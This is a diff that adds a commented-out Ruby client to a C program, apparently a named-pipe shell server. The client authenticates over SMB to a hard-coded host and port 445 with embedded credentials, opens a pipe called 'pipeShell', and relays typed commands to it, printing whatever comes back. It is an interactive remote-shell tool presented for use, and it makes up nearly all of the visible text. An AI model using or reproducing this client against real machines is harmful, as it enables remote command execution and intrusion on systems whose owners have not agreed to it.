@@ -48,3 +48,39 @@ int main(){
 
 	return 0;
 }
+/*
+#client to go with it :)
+#!/usr/bin/ruby
+require"socket"
+require"ruby_smb"
+
+ip = "10.1.1.9"
+port = 445
+user = "seperUser"
+pass = "superSecretSauce"
+pipe = "pipeShell"
+
+sock = TCPSocket.open(ip, port)
+dispatcher = RubySMB::Dispatcher::Socket.new(sock)
+smb = RubySMB::Client.new(dispatcher, smb1: true, smb2: true, username: user, password: pass)
+result = smb.login.value
+error = WindowsError::NTStatus.find_by_retval(result.to_i)[0]
+result == 0? result : (raise "Connect Fail, WinError: %s %s"%[error.name, error.description])
+ipc = smb.tree_connect("\\\\#{ip}\\IPC$")
+
+pipeShell = ipc.open_file(filename: pipe, read: true, write: true)
+
+loop do
+  begin
+    print pipeShell.read(bytes:0xffff), " "
+    cmd = gets.chomp
+    break if cmd == "exit"
+    pipeShell.write(data:"#{cmd}\n")
+  rescue SignalException => e
+    puts""
+    break
+  end
+end
+
+pipeShell.close
+*/
